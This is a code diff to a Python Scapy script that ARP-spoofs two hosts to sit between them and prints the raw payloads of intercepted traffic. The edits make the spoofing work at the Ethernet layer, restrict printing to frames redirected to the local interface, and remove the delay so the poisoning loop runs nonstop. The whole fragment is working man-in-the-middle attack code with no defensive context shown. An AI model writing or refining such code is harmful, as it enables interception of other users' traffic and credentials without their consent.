@@ -17,12 +17,12 @@ def spoof_arp(target_ip, spoof_ip, target_mac):
     Send an ARP response to the target IP with the spoofed IP.
     """
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, verbose=0)
+    sendp(Ether(dst=target_mac) / packet, verbose=False)
 
 def restore_arp(dst_ip, src_ip, dst_mac, src_mac):
     """Restore ARP tables to their original state"""
     packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
-    send(packet, count=3, verbose=0)
+    sendp(Ether(dst=dst_mac) / packet, count=3, verbose=False)
 
 
 def packet_callback(packet):
@@ -30,7 +30,8 @@ def packet_callback(packet):
     Print intercepted packets.
     """
     if IP in packet and packet.haslayer(Raw):
-        print(f"Received traffic from {packet[IP].src} to {packet[IP].dst}: {packet[Raw].load}")
+        if packet[0][0].dst == get_if_hwaddr('eth0'):
+            print(f"Received traffic from {packet[IP].src} to {packet[IP].dst}: {packet[Raw].load}")
 
 
 
@@ -70,7 +71,7 @@ def main():
     while True:
         spoof_arp(ip1, ip2, mac1)
         spoof_arp(ip2, ip1, mac2)
-        time.sleep(2)
+        # time.sleep(1)
 
 if __name__ == "__main__":
     main()
